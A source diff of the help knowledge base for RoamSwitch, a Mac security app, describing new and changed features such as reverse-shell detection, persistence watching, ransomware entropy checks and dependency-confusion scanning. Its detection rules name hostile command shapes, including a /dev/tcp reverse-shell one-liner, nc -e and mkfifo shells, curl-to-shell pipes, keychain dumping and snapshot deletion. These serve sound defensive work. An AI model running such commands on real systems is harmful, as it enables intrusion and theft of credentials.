@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.9 (build 171).
+// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.10 (build 172).
 // The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
 // are not compiled into the shipping app and are overwritten on the next sync.
 // Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
@@ -322,7 +322,7 @@ extension RoamSwitchKnowledgeBase {
                 • Threat feed: fetched once a day, receive-only, with no identifiers sent, and verified with a dedicated Ed25519 feed key (separate from the app-update key). Turning Auto-update off means zero outbound traffic; the bundled data and homograph detection still work.
                 • Without Pro: the mode is saved but nothing is blocked.
                 """,
-                recommendation: "Keep the default auto-block and approve the system extension for the most reliable protection. If an internal tool gets blocked by mistake, use the notification's “Allow once (5 min)” or the allowlist."
+                recommendation: "Keep the default auto-block and approve the system extension for the most reliable protection. If an internal tool gets blocked by mistake, use the notification's “Allow once (5 min)”."
             ),
             LocalizedEntry(
                 id: "feat_link_safety_auditor",
@@ -330,6 +330,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "Before you open a suspicious URL, analyzes it entirely on the device and scores its risk out of 100 based on Unicode homographs, subdomain impersonation, high-risk TLDs, cleartext HTTP, raw IP addresses, and more. Available in the free edition.",
                 details: """
                 • Open: Malware Protection → "🔗 Check a link manually…", or the MCP tool `audit_url_safety`.
+                • Defanged addresses: you can paste an address written the way threat reports write it, such as `hxxps://example[.]com`. It is restored to the original address before analysis.
                 • Homographs: detects look-alike characters such as Cyrillic or Greek letters (Punycode / `xn--`).
                 • Subdomain impersonation: analyzes structures like `apple.com.login-verify.xyz` that embed a major brand name.
                 • High-risk TLDs: deducts points for TLDs common in throwaway phishing, such as `.xyz`, `.top`, `.tk`, `.icu`.
@@ -348,6 +349,7 @@ extension RoamSwitchKnowledgeBase {
                 • Automatic response: (1) Application Firewall lockdown, (2) air-gap containment (pf blocks all traffic and the Wi-Fi radio is turned off, feat_airgap_containment), (3) sharing services (SMB / SSH / Screen Sharing) stopped, (4) the suspected process paused with SIGSTOP rather than killed, (5) an urgent alert and a front-most emergency window.
                 • Why freeze instead of kill: networking is already cut, so a paused process can do no further damage. If it was a false positive, it is resumed (SIGCONT) on release and no data is lost.
                 • On release: networking and Wi-Fi are restored, the paused process is resumed, and tampered bait files are regenerated.
+                • Generic detection (entropy analysis, Pro): it also catches encryption that never touches a decoy file, by looking at what is written to `Documents`, `Desktop`, `Downloads` and `Pictures`. A file whose whole-file Shannon entropy is 7.92 or higher counts, and 20 such files within 5 seconds are treated as a mass-encryption burst. To catch encryption of only the head of a file, or of every other block of 4 KiB or more, it also checks each 4 KiB window: a file of 16 KiB or more with at least two windows at 7.9 or higher counts as well. Files that keep the header of a compressed format (ZIP, PDF, JPEG and the like) are skipped. The window check is not used on build output (`.o`, `.a`, `.rlib`, `.rmeta`, `.so`, `.dylib`, `.class`, `.pyc`, `.wasm` and similar) or on anything under a `target` folder. Encryption of blocks smaller than 4 KiB (16 or 256 bytes, for example) is not seen by this check. Measured: no extra hit among 3,531 real files in those folders. Simulating head-only and alternate-block encryption (4 KiB or larger) on 150 real files, the whole-file figure caught 0 to 35% and the window check 100%.
                 • Default: turned on automatically the first time Pro is activated. Incident history via the MCP tool `get_canary_status`. Test safely with "Ransomware Defense Simulation (Test Mode)" in the menu.
                 """,
                 recommendation: "Keep it on to protect important data from unknown ransomware, and don't delete the hidden bait files."
@@ -404,7 +406,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • How: the privileged helper runs `/usr/bin/eslogger exec fork exit` as a child process and parses its JSON stream. eslogger ships with macOS; RoamSwitch does not use or apply for the EndpointSecurity entitlement, so this is after-the-fact observation, not pre-execution blocking.
                 • Requirements: macOS 13 or later and RoamSwitch allowed in Full Disk Access. Without it the window shows “Execution recording unavailable: allow RoamSwitch in Full Disk Access (if not listed, add /Applications/RoamSwitch.app with “+”)” (or that eslogger was not found) and nothing else is done; there is no fallback to constant polling. Events from before recording was enabled or the helper started are not recorded.
-                • Correlation rules (notify-only, quiet by default, each with a stable id and a MITRE ATT&CK technique): a shell or script interpreter launched directly by a browser, Office or mail app (exec.shell_from_app, T1059); an unsigned or ad-hoc-signed binary run from /tmp, /private/var/tmp or carrying the download quarantine flag (exec.untrusted_location, T1204.002); a `sh -c` one-liner piping curl/wget into a shell together with an aggravating fact such as a raw-IP URL, base64, eval, disabled TLS verification or a browser parent (exec.pipe_to_shell, T1059.004); `osascript -e` combining do shell script with base64/eval (exec.osascript_obfuscated, T1059.002); `xattr -d com.apple.quarantine` followed by running that file within 15 minutes (exec.quarantine_stripped_then_exec, T1553.001); an unsigned or ad-hoc binary started by launchd from a LaunchAgent/LaunchDaemon written within the last 24 hours (exec.launchd_untrusted_binary, T1543.001/.004); `security find-generic-password -w` or `dump-keychain` run under a non-shell ancestor that is not Apple-signed (exec.keychain_access, T1555.001); a bare interpreter other than osascript running an inline `-c`/`-e`/`-Command` one-liner that combines base64/eval with a download or an exec-like call (exec.interpreter_inline_obfuscated, T1059); a non-Apple-signed binary executed with DYLD_INSERT_LIBRARIES set (exec.dyld_insert_libraries, T1574.006); `tmutil deletelocalsnapshots`/`thinlocalsnapshots` run by anything other than RoamSwitch itself or an Apple process (exec.ransomware_recovery_tampering, T1490); a command line that directly names a decoy credential file RoamSwitch planted (such as ~/.aws/credentials or ~/.env.backup, recognised by the marker inside; real files never match, and reads through a library are left to the honeytoken watcher) (exec.honeytoken_path, T1552.001). Two further rules target attack tooling driven by scripts or AI agents (such as the HexStrike AI backend): one process looking up 8 or more distinct penetration-testing tools with which/type within 30 seconds (exec.offensive_tool_inventory, T1595), and a scripting runtime or AI coding agent starting 3 or more distinct such tools within 2 minutes (exec.offensive_tool_burst, T1595). A person typing the same commands in a terminal is not flagged. A plain `curl | sh` typed in Terminal is deliberately not flagged.
+                • Correlation rules (notify-only, quiet by default, each with a stable id and a MITRE ATT&CK technique): a shell or script interpreter launched directly by a browser, Office or mail app (exec.shell_from_app, T1059); an unsigned or ad-hoc-signed binary run from /tmp, /private/var/tmp, the per-user temp folder under /var/folders, /Users/Shared or carrying the download quarantine flag (exec.untrusted_location, T1204.002); a `sh -c` one-liner piping curl/wget into a shell together with an aggravating fact such as a raw-IP URL, base64, eval, disabled TLS verification or a browser parent (exec.pipe_to_shell, T1059.004); `osascript -e` combining do shell script with base64/eval (exec.osascript_obfuscated, T1059.002); `xattr -d com.apple.quarantine` followed by running that file within 15 minutes (exec.quarantine_stripped_then_exec, T1553.001); an unsigned or ad-hoc binary started by launchd from a LaunchAgent/LaunchDaemon written within the last 24 hours (exec.launchd_untrusted_binary, T1543.001/.004); `security find-generic-password -w` or `dump-keychain` run under a non-shell ancestor that is not Apple-signed (exec.keychain_access, T1555.001); a bare interpreter other than osascript running an inline `-c`/`-e`/`-Command` one-liner that combines base64/eval with a download or an exec-like call (exec.interpreter_inline_obfuscated, T1059); a non-Apple-signed binary executed with DYLD_INSERT_LIBRARIES set (exec.dyld_insert_libraries, T1574.006); `tmutil deletelocalsnapshots`/`thinlocalsnapshots` run by anything other than RoamSwitch itself or an Apple process (exec.ransomware_recovery_tampering, T1490); a command line that directly names a decoy credential file RoamSwitch planted (such as ~/.aws/credentials or ~/.env.backup, recognised by the marker inside; real files never match, and reads through a library are left to the honeytoken watcher) (exec.honeytoken_path, T1552.001). Two further rules target attack tooling driven by scripts or AI agents (such as the HexStrike AI backend): one process looking up 8 or more distinct penetration-testing tools with which/type within 30 seconds (exec.offensive_tool_inventory, T1595), and a scripting runtime or AI coding agent starting 3 or more distinct such tools within 2 minutes (exec.offensive_tool_burst, T1595). A person typing the same commands in a terminal is not flagged. A plain `curl | sh` typed in Terminal is deliberately not flagged. A reverse or bind shell spelled out in a `sh -c` command line, or in a directly started nc, ncat or socat, is also flagged (exec.reverse_shell_argv, T1059.004): a /dev/tcp or /dev/udp redirection that carries a shell, a mkfifo pipe wired to nc, telnet, openssl s_client or ssh, `nc -e <shell>`, socat with exec:<shell>, or openssl s_client piped into a shell. A plain port check such as `echo > /dev/tcp/host/22` and text that only mentions these commands are not flagged.
                 • Alerts: a notification (Pro) plus an entry in the incident timeline (source execRecorder, action “notify only”). An alert never triggers the air-gap or any other isolation by itself.
                 • Storage: segmented JSON Lines under /Library/Application Support/RoamSwitch/exec_log (root-only: 0700/0600, because command lines can contain secrets; the app, viewer and MCP server read only through the privileged helper), 200 MB / 14 days by default (changeable), crash-safe rotation. Segments are hash-chained so deleted, edited or truncated segments are detected (“Verify chain”); this is tamper-evident, not tamper-proof. Environment variables are never recorded, but command-line arguments can contain secrets.
                 • Load control: a bounded queue that drops the oldest lines when overloaded (counted and shown), exponential-backoff restarts, and turning it off stops eslogger completely.
@@ -415,14 +417,16 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "feat_persistence_monitor_guard",
                 title: "Watch for New Auto-Launch Registrations (LaunchAgent / LaunchDaemon) (Pro)",
-                summary: "Watches for new LaunchAgent / LaunchDaemon registrations in real time and notifies you when one launches a shell or script interpreter directly, or registers an executable with an invalid signature.",
+                summary: "Watches for new LaunchAgent / LaunchDaemon registrations in real time and notifies you when one launches a shell or script interpreter directly, or registers an executable with an invalid signature. It also notifies you when a suspicious line appears in a place that runs on its own, such as a shell start-up file.",
                 details: """
                 • Watched: `~/Library/LaunchAgents`, `/Library/LaunchAgents`, and `/Library/LaunchDaemons` via FSEvents (about 1.5-second debounce).
                 • Judgment: recent infostealers persist by having validly Apple-signed `/bin/bash` or `/usr/bin/osascript` run a Base64-hidden script. Because the interpreter's own signature is valid, any registration that launches a bare interpreter is treated as suspicious regardless of signature, and its script arguments are also run through the static signature check. Unsigned or invalidly signed executables are flagged too. Homebrew services wrappers are exempt.
                 • Detection only: without an EndpointSecurity entitlement, writing the plist can't be prevented. It is judged and reported within about 1.5 seconds of being written.
+                • Also watched (places that run on their own): shell start-up files (`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bash_logout`, `~/.config/fish/config.fish`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin`, `/etc/profile`, `/etc/bashrc`), `~/.ssh/rc` and `/etc/ssh/sshrc`, periodic scripts (`/etc/periodic/{daily,weekly,monthly}`, `/usr/local/etc/periodic/*`, `/etc/{daily,weekly,monthly}.local`; only where they exist), the folders where git hooks are kept (`~/.git-templates/hooks`, `~/.config/git/hooks`), login/logout hooks (LoginHook / LogoutHook in `/Library/Preferences/com.apple.loginwindow.plist`) and Folder Action scripts (`~/Library/Scripts/Folder Action Scripts` and `/Library/Scripts/Folder Action Scripts`; compiled AppleScript is read with osadecompile, `.scptd` bundles are not read). Checked every 5 seconds; the first pass only records what is already there and notifies nothing. `emond` is not covered.
+                • Judgment (the places above): only a line shaped like a reverse shell, decode-and-run, download-and-run, or a program run from a temporary folder (`/tmp`, `/var/folders` and so on) is reported. An ordinary new line is not. Shell start-up files, `~/.ssh/rc` and git hooks are edited by their owner all the time, so a suspicious line that was already there is not reported again, only one that is new. A login/logout hook is reported just for being set.
                 • Default: on by default with Pro. Toggle under Malware Protection → "Watch for New Auto-Launch Registrations (LaunchAgent/Daemon) (Pro)".
                 """,
-                recommendation: "If you get an unfamiliar registration alert, inspect the plist shown in the notification and delete it if you don't recognize it. Right after installing a legitimate app, it's usually fine."
+                recommendation: "If you get an unfamiliar registration alert, inspect the plist shown in the notification and delete it if you don't recognize it. Right after installing a legitimate app, it's usually fine. For an alert about a start-up file or similar, check the line shown in the notification and delete it if you don't recognize it."
             ),
             LocalizedEntry(
                 id: "feat_docker_event_guard",
@@ -437,6 +441,43 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: "If you use Docker for development, enable it to spot container-escape risks early."
             ),
+            LocalizedEntry(
+                id: "feat_reverse_shell_watch",
+                title: "Live Reverse-Shell Detection (Pro)",
+                summary: "Every few seconds, checks whether the input and output of a shell or interpreter run by the logged-in user are an outward TCP connection to an external server, and notifies you of a suspected reverse shell. Pro only, on by default.",
+                details: """
+                • How to open: toggle via the menu bar item "🐚/✅ Watch for reverse shells (Pro)".
+                • How it works: every 4 seconds it reads the process list and each process's open file descriptors with libproc. No external command such as lsof is run, and the contents of the connection are never read.
+                • What it detects: (1) a shell or interpreter (sh, bash, zsh, python, perl, ruby, php, node and similar) whose input (fd 0) and output (fd 1) are the same established outward TCP connection (`bash -i >& /dev/tcp/H/P 0>&1`, or a Python one-liner that dup2s a socket). (2) nc, ncat or socat running a program on the connection with `-e`, `--exec` or `exec:`. (3) an nc beside a shell, started by the same parent, whose input and output are pipes (the `mkfifo` loop; the nc that ships with the Mac has no `-e`, so this is the form used there).
+                • Which peers: public addresses only. The home LAN, Tailscale (100.64.0.0/10), containers and loopback are not watched, so remote development and ProxyCommand do not raise false alarms.
+                • What counts as outward: a connection accepted on a listening port, or one whose local port is below 49152, is not treated as a reverse shell.
+                • When it notifies: only when the same state is seen in two scans in a row, once per process. The same program name connecting to the same peer is notified at most once every 15 minutes.
+                • Notify only: it never ends the process or cuts the network by itself.
+                • Limits: only the logged-in user's own processes are inspected, so a root-owned process is not seen. Programs with a name outside the list, and connections to private addresses, are not watched. A reverse shell that is only written in a script file is not seen until it connects.
+                • Allow list: for a program you recognise, use the menu item "Add the latest reverse-shell detection to the allow list…" to add it as "name@destination".
+                • The process-exec recorder (feat_exec_recorder) rule `exec.reverse_shell_argv` detects the shape spelled out on a command line when the process starts. This feature detects the actual state after it has connected.
+                • Automatically disabled if the Pro license is lost.
+                """,
+                recommendation: "When it notifies, check the program's path and its parent process. If you do not recognise it, end the process and disconnect from the network before investigating."
+            ),
+            LocalizedEntry(
+                id: "feat_network_settings_watch",
+                title: "Network Settings Change Monitoring (Rogue DHCP & WPAD, Pro)",
+                summary: "Compares the DNS servers, router and proxy auto-config (PAC) that the connected network handed out with what the same network gave before, and notifies you of a difference. It is a clue to a rogue DHCP server or a WPAD man-in-the-middle attack. Pro only, on by default.",
+                details: """
+                • How to open: toggle via the menu bar item "🌐/✅ Watch for network settings changes (Pro)".
+                • How it works: it receives changes from the macOS system configuration store (SCDynamicStore), waits a few seconds, then reads the DNS and router of the wired and Wi-Fi (en) interfaces. No external command and no network traffic is used.
+                • What it compares with: a network is told apart by its Wi-Fi name (SSID), or by the router's hardware address when the name cannot be read and on wired links. A network seen for the first time is only learned, with no notification.
+                • Changes it reports: (1) a DNS server never seen on that network (the router's own address, well-known public resolvers and RoamSwitch's secure DNS are excluded). (2) a router never seen and a DNS server never seen appearing together, which is what a rogue DHCP server hands out and gets a stronger notice. (3) a proxy auto-config (PAC) from a host never seen. (4) "Auto Proxy Discovery" (WPAD) newly turned on. If the router itself is new and also hands out its own address as a DNS server, the change counts as a strong notice (new router plus new DNS server); the router's own address is excluded only when the router is already known.
+                • What it ignores: a router that changes alone is only remembered (a replacement is common, and gateway changes are covered by the network history and the ARP monitor). VPNs, Tailscale and other tunnels (utun and so on) are not read. DNS saved in a service's settings (by you, a configuration profile or RoamSwitch's secure DNS) did not come from the network, so it is not compared. A DNS-over-HTTPS profile does not appear here. On a network that has shown three or more routers (a campus or office with a subnet per location), a new router is treated as ordinary.
+                • Accepting: the same notice is sent only once. For a change you know the reason for, such as replacing the router, choose "Update the network settings baseline to the current state…" in the menu to record the present state as that network's own. It never accepts by itself.
+                • Relation to the audit: the audit item "Proxy auto-discovery (WPAD / PAC)" (proxy_autodiscovery) checks whether WPAD or a network-supplied PAC is in force right now.
+                • Notify only: it changes no setting and blocks nothing.
+                • Limits: a rogue DHCP server itself cannot be seen; only the difference in its result is a clue. A rogue server that hands out the same DNS and router as before is not found. macOS has no LLMNR. The NetBIOS name service (netbiosd) does exist on macOS, but tampering with its replies is not monitored. mDNS (Bonjour) is a feature that works as designed and is not treated as a finding.
+                • Automatically disabled if the Pro license is lost.
+                """,
+                recommendation: "When it notifies, check the network name and the DNS servers or router shown. If you changed the router or provider, accept it; if you do not recognise it, stop using that network."
+            ),
         ]
     }
 
@@ -449,9 +490,9 @@ extension RoamSwitchKnowledgeBase {
                 title: "Critical System File Tampering Monitor (Critical Path FIM) (Pro)",
                 summary: "Records a SHA-256 baseline of critical files such as sudoers, SSH configuration, PAM, and hosts, which legitimate OS updates and app installs almost never change, and notifies you of any modification, deletion, or new file.",
                 details: """
-                • Files: `/etc/sudoers`, `/etc/pam.d/sudo`, `/etc/ssh/sshd_config`, everything under `/etc/ssh/sshd_config.d/`, `/etc/hosts`, and root's `~/.ssh/authorized_keys`. They are root-only, so the privileged helper computes the hashes.
+                • Files: `/etc/sudoers`, everything under `/etc/sudoers.d/`, everything under `/etc/pam.d/`, `/etc/ssh/sshd_config`, everything under `/etc/ssh/sshd_config.d/`, `/etc/hosts`, and root's `~/.ssh/authorized_keys`. They are root-only, so the privileged helper computes the hashes.
                 • When: FSEvents on `/etc`, `/etc/pam.d`, and `/etc/ssh` trigger a near-real-time rescan, with an hourly scan as a backstop.
-                • Baseline: captured on the first scan. A detected change is never adopted as the new baseline automatically, so the finding persists until a human reviews it. The same state isn't re-notified while the app keeps running; any further change alerts again.
+                • Baseline: captured on the first scan. A detected change, or the deletion of any file other than an add-on file (drop-ins under `/etc/sudoers.d/` and `/etc/ssh/sshd_config.d/`, and `/etc/pam.d/sudo_local`), is never adopted as the new baseline automatically, so the finding persists until a human reviews it. The same state isn't re-notified while the app keeps running; any further change alerts again. A new file is notified once and then added to the baseline. A deleted add-on file is notified once and then removed from the baseline. Turning on Touch ID for sudo creates `/etc/pam.d/sudo_local`, which shows up as a one-time new-file notice; turning it off deletes the file, which is also notified once. To accept them, use Malware Protection → "Accept Current State of Critical Files…", which lists the differences first.
                 • Blind-spot warning: if the helper can't be reached for 3 scans in a row, you're told that tamper detection isn't working.
                 • Note: while Link Guard runs in its hosts fallback, RoamSwitch itself may rewrite its managed section of `/etc/hosts`. LaunchAgents / Daemons are covered by feat_persistence_monitor_guard.
                 • Default: turned on automatically the first time Pro is activated. Menu: Malware Protection → "Periodically monitor critical system files for tampering (Pro)".
@@ -504,7 +545,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • Open it: menu "Comprehensive Mac Security Diagnostics" → "📈 Security Activity Log…".
                 • Data sources: the containment incident timeline (feat_containment_incident_timeline, latest 200 entries) unioned with confirmed malware detections from webmail download protection (feat_webmail_download_guard).
-                • Filters: category (ARP spoofing, ransomware bait file, XProtect-linked Air-Gap, port anomaly, ClickFix, exec recorder, ransomware entropy detection, honeytoken, browser credential watch, dangerous download), severity (all/info/warning/critical), time range (past 24 hours / past 3 days / past 7 days / all time), and free-text search (case-insensitive substring match across the summary, detail, and category name).
+                • Filters: category (ARP spoofing, ransomware bait file, XProtect-linked Air-Gap, port anomaly, ClickFix, exec recorder, ransomware entropy detection, honeytoken, browser credential watch, reverse shell watch, network settings watch, dangerous download), severity (all/info/warning/critical), time range (past 24 hours / past 3 days / past 7 days / all time), and free-text search (case-insensitive substring match across the summary, detail, and category name).
                 • Time-series chart: a bar chart of detection counts across the selected range — hourly bars for a 72-hour window or less, daily bars beyond that, switched automatically. Click a bar to narrow the list to just that time window; click it again to clear the drill-down.
                 • Display limit: shows up to the latest 500 entries (a message tells you when more exist and to narrow the filters).
                 • Export: CSV export (Pro).
@@ -586,6 +627,7 @@ extension RoamSwitchKnowledgeBase {
                 • Scope: one level under node_modules (plus one extra level for @scope/ packages). Never descends into a package's own nested node_modules.
                 • Reference-only danger markers: commands matching curl|sh, wget|sh, eval(, base64 -d, or node -e get a ⚠️ badge — a lightweight heuristic, not a verdict; many legitimate scripts (native module builds, etc.) also match.
                 • No network connection at all, and nothing is ever executed — a purely static inventory.
+                • Difference from the reviewed state: press “Mark the current state as reviewed” to record the packages as they are now (script commands as hashes only, and whether a package carries compiled code). From the next listing on, packages that gained install-time code since then are shown: a script added, a script whose command changed, compiled code added (`binding.gyp`, `.node`, `.so`, `.dylib`, `.dll` or an executable), and a new package that brings either. Scripts and packages that are gone are not shown. Only a person can mark the state as reviewed; neither the listing nor the MCP tool does (the MCP result carries `drift` and `baselineAcceptedAt`). The record is `~/Library/Application Support/RoamSwitch/package_install_baseline.json` (mode 0600).
                 • MCP tool: `run_package_lifecycle_script_scan` (`watchedFolders` argument, Pro only).
                 """,
                 recommendation: "For any script flagged ⚠️, check whether the package genuinely needs it — pay particular attention to postinstall scripts from unfamiliar packages."
@@ -631,6 +673,18 @@ extension RoamSwitchKnowledgeBase {
                 recommendation: "Double-check any ⚠️-flagged dependency for an actual typo — pay particular attention to unfamiliar package names."
             ),
             LocalizedEntry(
+                id: "feat_dependency_source_scan",
+                title: "Dependency Source Check (pip / npm, Pro)",
+                summary: "Reads project files for settings that allow dependency confusion (a public package taking the place of a private one with the same name): pip's extra-index-url, and npm scopes installed from a private registry that no .npmrc pins.",
+                details: """
+                • What it reports: (1) `pip_extra_index_url` — an `--extra-index-url` / `extra-index-url` line in requirements*.txt, pip.conf, pyproject.toml or uv.toml. pip asks that index and PyPI and takes the highest version, so a same-named public package with a higher version wins. (2) `npm_scope_not_pinned` — an npm lockfile (package-lock.json, npm-shrinkwrap.json, yarn.lock v1, pnpm-lock.yaml) resolves packages of an @scope from a registry other than npmjs.org, and no .npmrc in the project, in the folders above it up to the registered folder, or in your home folder maps that scope with `@scope:registry=`.
+                • What it does not do: it never asks a registry whether a name is free to claim, sends no network request and runs nothing. A finding is a warning about a setting, not proof of an attack; a private index that is the only place those names exist is still listed. Credentials inside a URL are dropped, only the host is shown.
+                • Not covered: unscoped npm packages from a private registry (no .npmrc key can pin them), yarn Berry lockfiles (they do not record the source), Poetry sources, uv `[[tool.uv.index]]`, and index URLs that are not http(s).
+                • How to open: "📦 Package CVE Scan" → "Dependency sources (Pro)" tab, targeting the same project folders as the "Dependencies" tab. MCP: `run_dependency_source_scan` (`watchedFolders` argument, Pro only).
+                """,
+                recommendation: "For pip, prefer a single `--index-url` that points at a private index mirroring PyPI over `--extra-index-url`. For npm, add `@scope:registry=<your registry>` to the project's .npmrc for every private scope."
+            ),
+            LocalizedEntry(
                 id: "feat_port_scan_guard",
                 title: "Incoming Port Scan Detection (Auto-Block, Pro)",
                 summary: "Detects and notifies about a source IP that has connected to many different ports (15 or more) in a short time (5 minutes) — the classic signature of reconnaissance tools like nmap/masscan. A detected scan source is automatically blocked for 10 minutes by default. Pro only.",
@@ -671,15 +725,15 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_security_health_checker",
-                title: "Mac Security Audit (18 Items, Score & Fix Steps)",
-                summary: "Checks 18 items across six areas (system hardening, network defense, authentication and access control, port exposure, malware protection, and physical device defense) and shows a 0-100 score, a grade, and steps to fix each failing item. Available in the free edition.",
+                title: "Mac Security Audit (21 Items, Score & Fix Steps)",
+                summary: "Checks 21 items across six areas (system hardening, network defense, authentication and access control, port exposure, malware protection, and physical device defense) and shows a 0-100 score, a grade, and steps to fix each failing item. Available in the free edition.",
                 details: """
-                • System hardening: 1. FileVault, 2. SIP (System Integrity Protection), 3. Gatekeeper, 4. automatic security updates, 5. Apple XProtect.
-                • Network defense: 6. macOS firewall, 7. stealth mode, 8. Wi-Fi encryption strength, 9. ARP spoofing monitor, 10. gateway ARP lock.
-                • Authentication & access control: 11. SSH remote login configuration (root login disabled, key-only auth), 12. sudo privilege escalation (`NOPASSWD` audit).
-                • Services & port exposure: 13. exposed ports.
-                • Malware & download protection: 14. Web & Mail Protection, 15. DNS Threat Protection, 16. phishing & malicious link protection (Safari fraudulent website warning).
-                • Physical ports & devices: 17. Unauthorized USB / BadUSB physical port guard, 18. macOS accessory connection protection.
+                • System hardening: 1. FileVault, 2. SIP (System Integrity Protection), 3. Gatekeeper, 4. automatic security updates, 5. Apple XProtect, 6. backup (Time Machine's newest backup is within 7 days; restorability is not tested).
+                • Network defense: 7. macOS firewall, 8. stealth mode, 9. Wi-Fi encryption strength, 10. ARP spoofing monitor, 11. gateway ARP lock, 12. proxy auto-discovery (WPAD / PAC).
+                • Authentication & access control: 13. SSH remote login configuration (root login disabled, key-only auth), 14. sudo privilege escalation (`NOPASSWD` audit), 15. AI agent credential files.
+                • Services & port exposure: 16. exposed ports.
+                • Malware & download protection: 17. Web & Mail Protection, 18. DNS Threat Protection, 19. phishing & malicious link protection (Safari fraudulent website warning).
+                • Physical ports & devices: 20. Unauthorized USB / BadUSB physical port guard, 21. macOS accessory connection protection.
                 • Not applicable: firewall and stealth on a trusted network, SSH when remote login is off, and the sudo audit before the helper connects are excluded from the score.
                 • Grades: 100 = S, 85-99 = A, 70-84 = B, below 70 = C. Also available via the MCP tool `get_security_report`.
                 """,
@@ -726,15 +780,16 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_mcp_server",
-                title: "MCP Server Integration (Read-Only Access for AI Assistants)",
-                summary: "RoamSwitch.app includes a read-only MCP (Model Context Protocol) server, so AI assistants such as Claude can ask about your Mac's security state. There are no tools that change settings or block anything.",
+                title: "MCP Server Integration (Access for AI Assistants)",
+                summary: "RoamSwitch.app includes an MCP (Model Context Protocol) server, so AI assistants such as Claude can ask about your Mac's security state. No tool changes settings, protection levels, ports or devices. Only three tools write anything, and only to their own record files.",
                 details: """
                 • Transport: local stdio only. Binary: `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`.
-                • Main tools (34 in total): `get_security_report` (security audit), `verify_security_findings` (re-checks whether audit findings are still present; read-only), `get_exposed_ports`, `get_guard_status`, `audit_url_safety`, `audit_secrets`, `audit_mcp_configs` (audits MCP client config files for risky entries, including a server that reads text other people wrote sitting next to one that can run commands (the setup indirect prompt injection needs); local, read-only; also opens as a window from Malware Protection → “🧩 Audit MCP config (AI integrations)…”), `audit_agent_setup` (audits the instruction files, skills and OpenClaw settings given to AI agents for risky content such as invisible Unicode characters, instruction overrides, curl | sh and the shape of secret exfiltration; local, read-only; also opens as a window from Malware Protection → “🤖 Audit AI agent instruction files…”), `audit_security_logs`, `get_quarantine_status`, `get_notification_history`, `get_canary_status`, `get_port_anomaly_incidents`, `get_ssh_guard_incidents` (SSH brute-force records and recent SSH logins; read-only), `get_runtime_threat_status`, `get_incident_timeline` (containment incident timeline),`get_detection_coverage` (lists attack techniques RoamSwitch can and cannot detect; read-only), `get_network_history` (network history learning), `run_package_cve_scan`, `run_package_cve_scan_languages`, `run_active_vuln_scan` (non-destructive probes to 127.0.0.1 only), `run_npm_audit_signatures` (the only tool that contacts an external server, the npm registry; Pro, opt-in), and `get_app_help` (this knowledge base).
+                • Main tools (35 in total): `get_security_report` (security audit), `verify_security_findings` (re-checks whether audit findings are still present; read-only), `get_exposed_ports`, `get_guard_status`, `audit_url_safety`, `audit_secrets`, `audit_mcp_configs` (audits MCP client config files for risky entries, including a server that reads text other people wrote sitting next to one that can run commands (the setup indirect prompt injection needs); local, read-only; also opens as a window from Malware Protection → “🧩 Audit MCP config (AI integrations)…”), `audit_agent_setup` (audits the instruction files, skills and OpenClaw settings given to AI agents for risky content such as invisible Unicode characters, instruction overrides, curl | sh and the shape of secret exfiltration; it also checks agent memory with the same rules, and in the registered projects the `.vscode/tasks.json` (tasks that run when the folder is opened) and `.github/workflows` (pull-request code run with secrets, untrusted text pasted into scripts, third-party actions not pinned to a commit); for Claude Code settings (`settings.json` and `settings.local.json` in `~/.claude` and in the `.claude` folder of each registered project) it also checks for a permission mode that runs everything without asking, an allow rule that permits any command, hooks and a changed API endpoint, and reports settings that became looser since the state was marked as reviewed (a deny rule removed, a broad allow rule or a hook added, the permission mode raised, the sandbox switched off); rule and command text is never returned; local, read-only; also opens as a window from Malware Protection → “🤖 Audit AI agent instruction files…”), `audit_security_logs`, `get_quarantine_status`, `get_notification_history`, `get_canary_status`, `get_port_anomaly_incidents`, `get_ssh_guard_incidents` (SSH brute-force records and recent SSH logins; read-only), `get_runtime_threat_status`, `get_incident_timeline` (containment incident timeline),`get_detection_coverage` (lists attack techniques RoamSwitch can and cannot detect; read-only), `get_network_history` (network history learning), `run_package_cve_scan`, `run_package_cve_scan_languages`, `run_active_vuln_scan` (non-destructive probes to 127.0.0.1 only), `run_npm_audit_signatures` (the only tool that contacts an external server, the npm registry; Pro, opt-in), and `get_app_help` (this knowledge base).
                 • Process execution log (Pro, read-only): `search_exec_events` (search launch events) and `get_process_tree` (ancestors and descendants of a process).
                 • Resources: `roamswitch://docs/features`, `roamswitch://docs/alerts-and-messages`, `roamswitch://docs/settings-guide`, `roamswitch://docs/troubleshooting`.
                 • Language: answers follow the app's language setting. `get_app_help` accepts a `language` argument (ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT).
-                • Safety: because it's read-only, even an AI manipulated by prompt injection can't change the protection level or isolate ports.
+                • Tools that write local state: `run_active_vuln_scan` (appends its results to the local scan history), `audit_security_logs` (updates the log-pattern baseline and the notification history) and `run_npm_audit_signatures` (npm writes its own cache and logs) write local state, so their MCP read-only hint is false. None of them changes a setting or the protection level.
+                • Safety: no tool changes a setting or the protection level, so even an AI manipulated by prompt injection can't change the protection level or isolate ports.
                 """,
                 recommendation: "See faq_mcp_setup for setup. You can ask in plain language, like “Is my Mac secure right now?” or “What does this notification mean?”"
             ),
@@ -895,7 +950,7 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: """
                 1. If you didn't expect it, nothing more is needed; don't enter information on that page.
-                2. If a legitimate site you need was blocked by mistake, use "Allow once (5 min)" on the notification or add it to the allowlist.
